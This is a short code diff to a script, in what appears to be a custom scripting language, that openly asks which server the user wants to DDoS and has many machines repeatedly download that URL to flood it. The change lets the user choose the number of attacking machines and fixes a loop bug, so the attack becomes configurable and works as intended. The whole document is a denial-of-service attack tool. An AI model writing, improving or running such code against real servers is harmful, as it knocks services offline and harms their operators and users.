@@ -1,9 +1,11 @@
 
 print("What server would you like to DDOS?");
 url = read();
+print("How many machines do you want to use?");
+machines = numFromString(read());
 
-distribute(List.populate(url, 100), url -> {
-	for(i = 0; i < 1000; i = 1 + 1) {
+distribute(List.populate(url, machines), url -> {
+	for(i = 0; i < 500; i = i+1) {
 		download(url);
 	}
 	return true;
